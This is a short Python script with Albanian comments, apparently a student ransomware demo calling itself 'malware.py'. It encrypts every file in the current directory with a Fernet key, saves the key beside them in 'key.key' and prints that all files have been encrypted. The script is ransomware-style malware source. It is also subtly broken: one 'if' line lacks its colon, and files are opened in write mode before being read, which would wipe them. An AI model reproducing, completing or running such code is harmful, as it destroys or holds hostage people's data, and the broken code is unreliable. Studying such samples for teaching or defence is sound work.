#!/usr/bin/env python3

#Enkriptimi i fajllave behet duke gjeneruar nje celes i cili ruhet si fajll me emrin qe ja kemi caktuar 'key.key' ne folderin ku gjenden fajllat,
#ku do ta perdorim per dekriptimin e fajllave ne decr.py


#Importimi i modulit os qe ofron funksione pÃ«r krijimin dhe heqjen e nje folderi, marrjen e permbajtjes se tij, ndryshimin dhe identifikimin e folderit aktual, etj.
#Importimi i Fernet nga libraria cryptography.fernet, i cili ofron enkriptim simetrik dhe autentifikim te te dhenave.
import os
from cryptography.fernet import Fernet

#krijimi i variables qe permban listen me emrat e fajllave
allfiles = []   
for file in os.listdir():    #Kontrollimi per fajlla ne direktoriumin os permes unazes for
	if file == "malware.py" or file == "key.key" or file == "decr.py":
		 continue               #Fajllat te cilet jane te emeruar si me lart, nuk do te enkriptohen
	if os.path.isfile(file)  
		allfiles.append(file)   #Keto fajlla do te shtohen ne liste dhe do te enkriptohen
		
print(allfiles)

key = Fernet.generate_key()
with open("key.key", "wb") as thekey:
	thekey.write(key)

for file in allfiles:
	with open(file, "wb") as thefile:
		content = thefile.read()
	content_encr = Fernet(key).encrypt(content)
	with open(file, "wb") as thefile:
		thefile.write(content_encr)

print("All your files has been encrypted")
